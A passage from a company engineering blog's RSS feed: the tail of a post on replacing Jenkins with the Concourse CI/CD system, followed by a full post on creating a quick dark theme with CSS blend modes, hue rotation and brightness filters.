We try to do all of our infrastructure configuration via <a href="https://www.gitops.tech/" target="_blank" rel="noopener noreferrer">gitops</a> so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.</p><p>We spent time investigating other options, and eventually settled on <strong><a href="https://concourse-ci.org/" target="_blank" rel="noopener noreferrer">Concourse</a>, a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml</strong>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="infrastructure-as-code">Infrastructure as code<a class="hash-link" href="#infrastructure-as-code" title="Direct link to heading">​</a></h2><p>We run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It's fast and easy to upgrade and redeploy.</p><p>Within Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">jobs:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">- name: run-acceptance-tests-staging</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  plan:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  - task: run-tests</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    config:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      inputs:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      - name: monorepo</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      run:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        path: /bin/bash -c runtests.sh</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    on_failure:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      put: notify-slack-ci</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="Concourse task" src="/jp/assets/images/concourse_task-5f5e8d20c17a76621005be33cc80337b.png" width="1506" height="576" class="img_ev3q"></p><p>Pipelines are made up of jobs that run in series or parallel; jobs consist of tasks.
Pipelines, jobs and tasks are described in code and automatically visualised in the UI.
Changes to pipelines are applied by updating the yaml file and running Concourse's <a href="https://concourse-ci.org/fly.html" target="_blank" rel="noopener noreferrer">fly cli</a> tool.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="containerised-deployment">Containerised deployment<a class="hash-link" href="#containerised-deployment" title="Direct link to heading">​</a></h2><p>Concourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.
This is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.</p><p>We use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.
It look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.
The only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn't really too much of an issue.</p><p>There were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.</p><p><img loading="lazy" alt="Concourse pipeline" src="/jp/assets/images/concourse_pipeline-e3a037cb649aa0ca87e8e14058b459e7.png" width="2760" height="392" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="debugging">Debugging<a class="hash-link" href="#debugging" title="Direct link to heading">​</a></h2><p>Since the tasks all run in containers, it's easy to debug issues locally by running the same image on the laptop as is running in Concourse.
Alternatively, the <a href="https://concourse-ci.org/tasks.html#running-tasks" target="_blank" rel="noopener noreferrer">fly execute</a> cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.</p><p>The <a href="https://concourse-ci.org/builds.html#fly-intercept" target="_blank" rel="noopener noreferrer">fly intercept</a> tool offers a way to log into a running container in concourse to troubleshoot:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">$ fly intercept -j ecs-services</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">1: build #27, step: monorepo, type: get</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">2: build #27, step: notify-slack-ci, type: get</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">3: build #27, step: notify-slack-ci, type: put</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">4: build #27, step: run-acceptance-tests-staging, type: task</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">choose a container: 4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">root@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="resource-types-and-extending-concourse">Resource types and extending Concourse<a class="hash-link" href="#resource-types-and-extending-concourse" title="Direct link to heading">​</a></h2><p>There are a large number of <a href="https://github.com/concourse/concourse/wiki/Resource-Types" target="_blank" rel="noopener noreferrer">resource types</a> available for Concourse, making it fairly straightforwards to configure pipelines.</p><p>As resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.</p><p>A resource type needs to implement the following executables/scripts:</p><ul><li>check (checking new versions of the resource, eg. is there a new pull request)</li><li>in (pulling a new version of the resource down, eg. download code from a pull request)</li><li>out (pushing a new version of the resource up, eg. push a build result to Github)</li></ul><p>These binaries need to be placed under /opt/resource in the docker container.
Concourse calls these binaries with JSON payload and optional parameters that can all be found <a href="https://concourse-ci.org/implementing-resource-types.html" target="_blank" rel="noopener noreferrer">here</a>.
What is done in those executables/scripts is up to the implementer, but it is really easy to extend concourse using this mechanism.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="learning-curve">Learning curve<a class="hash-link" href="#learning-curve" title="Direct link to heading">​</a></h2><p>The move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it's that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.</p><p>The documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we're finding it easier and easier to add more.
Similarly, it took some time to settle on how to allocate resources such that we cope with load but aren't wasteful at quiet times.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a class="hash-link" href="#summary" title="Direct link to heading">​</a></h2><p>The biggest improvements of Concourse over Jenkins have been:</p><ul><li>clean UI, no clicky clicky</li><li>every build uses its own container - no shared dependencies or artifacts</li><li>configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse</li><li>configuration of pipelines in code - good visibility into running tasks</li><li>wide range of resource types</li><li>ability to extend resources</li><li>easy to troubleshoot and debug</li></ul><p>Overall, we're pretty pleased with Concourse. There are a few features we're eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="references">References<a class="hash-link" href="#references" title="Direct link to heading">​</a></h2><ul><li><a href="https://github.com/concourse" target="_blank" rel="noopener noreferrer">https://github.com/concourse</a></li><li><a href="https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey" target="_blank" rel="noopener noreferrer">https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey</a></li><li><a href="https://github.com/karlkfi/concourse-dcind" target="_blank" rel="noopener noreferrer">https://github.com/karlkfi/concourse-dcind</a></li><li><a href="https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh" target="_blank" rel="noopener noreferrer">https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh</a></li><li><a href="https://concoursetutorial.com" target="_blank" rel="noopener noreferrer">https://concoursetutorial.com</a></li></ul>]]></content:encoded>
            <category>infrastructure</category>
            <category>CICD</category>
            <category>devops</category>
        </item>
        <item>
            <title><![CDATA[Hacking dark themes with CSS blend modes]]></title>
            <link>https://www.wgtwo.com/jp/blog/hacking-dark-themes-with-css-blend-modes/</link>
            <guid>hacking-dark-themes-with-css-blend-modes/</guid>
            <pubDate>Tue, 25 Jun 2019 00:00:00 GMT</pubDate>
            <description><![CDATA[Like many other companies, Working Group Two has a number of applications which are]]></description>
            <content:encoded><![CDATA[<p>Like many other companies, <a href="/jp/">Working Group Two</a> has a number of applications which are
only available internally or to partners.
Our UI designer (that's me) prefers light backgrounds with dark text, but one of our
partners have wanted a dark theme for one of our applications for some time.
We haven't been able to prioritize this, but we were using CSS blend modes for a different project,
and wondered if we could use them to quickly put together a dark theme.</p><p>The application in this post is one of our partner portals, which follows the Material Design
guidelines. It’s built with <a href="https://vuejs.org/" target="_blank" rel="noopener noreferrer">Vue</a> and <a href="https://vuetifyjs.com/en/" target="_blank" rel="noopener noreferrer">Vuetify</a>,
but also has some custom components and JS plugins (for uploads, charts, etc).
It took two hours to create the dark theme and deploy it to production, and we'll walk
you through the whole process (with screenshots) in this post.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-are-css-blend-modes">What are CSS blend modes?<a class="hash-link" href="#what-are-css-blend-modes" title="Direct link to heading">​</a></h2><p>Mozilla has a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode" target="_blank" rel="noopener noreferrer">page</a> which explains
the concept fairly well. In short, blend modes decide what should happen when two colors are
put on top of each other. The default blend mode is <code>normal</code>, which is what most people are used to.
As an example, the <code>normal</code> blend mode paints dark text on top of a light background on the
page you’re reading right now.</p><p>The application we have is light and we want it to be dark, so we need to look for blend modes that
can help with that. Scrolling through the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode" target="_blank" rel="noopener noreferrer">list at MDN</a>,
one mode in particular stands out:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">difference</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    The final color is the result of subtracting the darker of the two colors from the lighter one.</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    A black layer has no effect, while a white layer inverts the other layer's color.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><img loading="lazy" alt="Starting point, mostly basic Vuetify" src="/jp/assets/images/01-console-subs-light-075d22a876ee12009b47dd134e9085a1.png" width="1337" height="859" class="img_ev3q">
<img loading="lazy" alt="After applying" src="/jp/assets/images/01-console-subs-difference-4045fc8e52600e88c507fea828b111fc.png" width="1337" height="859" class="img_ev3q"></p><p>Okay, that’s actually not too bad. There are some obvious issues, like the color hues being
inverted and everything being way too dark, but it should be possible to make some adjustments.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="working-with-a-non-standard-blend-mode">Working with a non-standard blend mode<a class="hash-link" href="#working-with-a-non-standard-blend-mode" title="Direct link to heading">​</a></h2><p>The most jarring issue is that the colors have been inverted.
Our teal logo is now red, and the red "unlocked account" icon we use in development mode is now teal.
This is in line with the documentation for the <code>difference</code> blend mode, but luckily CSS also supports hue-rotation,
so we can just rotate the hue back 180 degrees. Our base style now looks like this:</p><div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Hue is measured in degrees from 0 to 360, so we're flipping the hues twice.
Below, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).
All the effects are applied to the same image here in your browser.</p><p>As you can see from the illustration, brightness and saturation
is not accounted for with hue-rotate, so most colors won't look the same.
They will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.<!-- -->\<!-- -->
We're lucky that our brand color doesn't change too much!</p><p>So, this fixes our colors, but we also have to do something about the darkness.
The whole application is pretty much pitch black, and to make it brighter we need to … turn down the brightness:</p><div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">   </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0.67</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let's have a look <small>(click to enlarge)</small>:</p><p>That’s a lot better (blend modes are fun!). Our dark theme is close to done now,
but we have one problem remaining: shadows. Because of our blend mode, making
things darker means making them brighter, so all our shadows look like white glows.
Since our base color is white/light gray, we can’t simply change our shadows to white as there would be no contrast.
Our solution was to embrace the “glow” feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:</p><p>As you might have noticed in the previous screenshot, we also made some other adjustments.
We made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),
since contrast is lower in the dark theme.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="more-comparison-screenshots">More comparison screenshots<a class="hash-link" href="#more-comparison-screenshots" title="Direct link to heading">​</a></h2><p>The following gallery shows some screenshots with custom components and JavaScript plugins.
No additional CSS was written for any of the views <small>(click to enlarge)</small>:</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a class="hash-link" href="#conclusion" title="Direct link to heading">​</a></h2><p>All in all, it took around two hours to create this dark theme. Most of the time was
spent experimenting with different settings to get acceptable contrast ratios.
There are probably better ways of doing this, but this was incredibly quick,
and allowed us to deliver something we normally wouldn't be able to deliver.
Other than the shadows, nothing is particularly ugly, so we consider this a success.
The whole style sheet is just a couple of selectors :</p><div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)">html</span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">mix-blend-mode</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> difference</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0.67</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">hue-rotate</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">180</span><span class="token unit">deg</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">font-weight</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">700</span><span class="token plain"> </span><span class="token important">!important</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token comment" style="color:rgb(105, 112, 152);font-style:italic">/* Glow for dropdown/card-hover*/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.v-menu__content</span><span class="token selector punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token selector" style="color:rgb(199, 146, 234)"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token selector" style="color:rgb(199, 146, 234)"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.v-card--hover</span><span class="token selector pseudo-class" style="color:rgb(199, 146, 234)">:hover</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">box-shadow</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token unit">px</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">20</span><span class="token unit">px</span><span class="token plain"> </span><span class="token color function" style="color:rgb(130, 170, 255)">rgba</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token color number" style="color:rgb(247, 140, 108)">142</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">255</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">252</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token color"> </span><span class="token color number" style="color:rgb(247, 140, 108)">0.74</span><span class="token color punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token selector class" style="color:rgb(199, 146, 234)">.dark-mode</span><span class="token selector" style="color:rgb(199, 146, 234)"> </span><span class="token selector class" style="color:rgb(199, 146, 234)">.logo</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token property">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">brightness</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thanks for reading!</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="faq">FAQ<a class="hash-link" href="#faq" title="Direct link to heading">​</a></h2><p><em>“Many CSS frameworks have a dark-mode, why not use that?”</em>\<!-- -->
Vuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have
to write custom CSS for our own components, and for other libraries we’re using (primarily for charts).
The great thing about the blend-mode hack is that is operates independently of any framework.
You set it on an HTML tag and it treats everything the same way.</p><p><em>“What about accessibility?”</em>\<!-- -->
Yeah, this isn't great for accessibility. Since we're lowering the brightness to 67% we're losing a lot of contrast.
We increased the font-weight to mitigate the effects of this, but you shouldn't use this technique for your primary theme.</p><p><em>“What about browser support?”</em>\<!-- -->
Supported in modern browsers, except Edge.
There's a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode#Browser_Compatibility" target="_blank" rel="noopener noreferrer">detailed table</a> available on MDN.</p><p><em>“What about performance?”</em>\<!-- -->
We haven't had any problems with performance, but some readers noted that they tried
the trick on a complex website (Jira), which resulted in sluggish behavior.</p>]]></content:encoded>
            <category>CSS</category>
            <category>frontend</category>
            <category>design</category>
        </item>
    </channel>
</rss>